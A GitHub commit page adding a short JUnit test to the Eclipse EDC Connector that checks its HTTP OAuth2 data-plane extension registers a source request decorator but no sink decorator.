[View file](/eclipse-edc/Connector/blob/a4e6018d2c0457fba6f672fafa6c590513c45d1b/extensions/data-plane/data-plane-http-oauth2-core/src/test/java/org/eclipse/edc/connector/dataplane/http/oauth2/DataPlaneHttpOauth2ExtensionTest.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -0,0 +1,47 @@ |
|  |  | /\* |
|  |  | \* Copyright (c) 2024 Bayerische Motoren Werke Aktiengesellschaft (BMW AG) |
|  |  | \* |
|  |  | \* This program and the accompanying materials are made available under the |
|  |  | \* terms of the Apache License, Version 2.0 which is available at |
|  |  | \* https://www.apache.org/licenses/LICENSE-2.0 |
|  |  | \* |
|  |  | \* SPDX-License-Identifier: Apache-2.0 |
|  |  | \* |
|  |  | \* Contributors: |
|  |  | \* Bayerische Motoren Werke Aktiengesellschaft (BMW AG) - initial API and implementation |
|  |  | \* |
|  |  | \*/ |
|  |  |  |
|  |  | package org.eclipse.edc.connector.dataplane.http.oauth2; |
|  |  |  |
|  |  | import org.eclipse.edc.connector.dataplane.http.spi.HttpRequestParamsProvider; |
|  |  | import org.eclipse.edc.junit.extensions.DependencyInjectionExtension; |
|  |  | import org.eclipse.edc.spi.system.ServiceExtensionContext; |
|  |  | import org.junit.jupiter.api.BeforeEach; |
|  |  | import org.junit.jupiter.api.Test; |
|  |  | import org.junit.jupiter.api.extension.ExtendWith; |
|  |  |  |
|  |  | import static org.mockito.ArgumentMatchers.isA; |
|  |  | import static org.mockito.Mockito.mock; |
|  |  | import static org.mockito.Mockito.never; |
|  |  | import static org.mockito.Mockito.verify; |
|  |  |  |
|  |  | @ExtendWith(DependencyInjectionExtension.class) |
|  |  | class DataPlaneHttpOauth2ExtensionTest { |
|  |  |  |
|  |  | private final HttpRequestParamsProvider paramsProvider = mock(); |
|  |  |  |
|  |  | @BeforeEach |
|  |  | void setUp(ServiceExtensionContext context) { |
|  |  | context.registerService(HttpRequestParamsProvider.class, paramsProvider); |
|  |  | } |
|  |  |  |
|  |  | @Test |
|  |  | void verifyRegisterKafkaSource(DataPlaneHttpOauth2Extension extension, ServiceExtensionContext context) { |
|  |  | extension.initialize(context); |
|  |  |  |
|  |  | verify(paramsProvider).registerSourceDecorator(isA(Oauth2HttpRequestParamsDecorator.class)); |
|  |  | verify(paramsProvider, never()).registerSinkDecorator(isA(Oauth2HttpRequestParamsDecorator.class)); |
|  |  | } |
|  |  |  |
|  |  | } |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `a4e6018`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Feclipse-edc%2FConnector%2Fcommit%2Fa4e6018d2c0457fba6f672fafa6c590513c45d1b) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


